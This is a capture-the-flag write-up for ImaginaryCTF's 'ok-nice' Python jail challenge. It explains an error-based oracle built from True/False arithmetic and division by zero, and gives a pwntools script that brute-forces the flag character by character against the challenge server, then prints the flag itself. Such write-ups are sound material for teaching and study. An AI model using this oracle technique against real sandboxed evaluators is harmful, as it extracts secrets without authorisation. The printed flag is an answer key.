https://ctftime.org/event/2396

# ok-nice (misc)

python jail

## Solution

Very limited range of options, nothing gets printed other than
`ok-nice` or `error`.

So the idea is to use the error as an oracle and brute force every char.

The main thing we are looking for is how to generate integers, so we can both index
flag and compare it to the result of ord.

Both `flag[True]` or `flag[False]` work.

True and False also work for generating integers:
```python
(True + True) = 2
```

So now we can both index and compare two chars, something like:
```python
ord(flag[True]) - (True+True) # checks if flag[1] == '\x02'
```

Now we just need to throw an error whenever they match
```python
True / (ord(flag[True]) - (True+True)) # division by zero when they match
```

Then just loop through every idx and every char.

```python
#!/usr/bin/env python3

from pwn import *

p = remote("ok-nice.chal.imaginaryctf.org", 1337)

def guess(char):
    n = ord(char)
    ret = ""
    for _ in range(n):
        ret = ret + "True+"
    ret = ret[:-1]
    return ret

def get_idx(n):
    ret = ""
    for _ in range(n+1):
        ret = ret + "True+"
    ret = ret[:-1]
    return ret

def build_payload(guess, idx):
    return f"ord(flag[True])/(({guess})-ord(flag[{idx}]))"

import string, time

chars = string.printable

flag = ""
for i in range(0, 100):
    idx = get_idx(i)
    for char in chars:
        payload = build_payload(guess(char), idx)
        p.sendlineafter("Enter input: ", payload)
        time.sleep(0.100)
        out = p.recvline()
        if "error" in out.decode():
            flag = flag + char
            print(f"DEBUGPRINT[18]: go.py:45: flag={flag}")

p.interactive()
```

## Flag
`ictf{0k_n1c3_7f4d3e5a6b}`

shafouz 2024/07/21
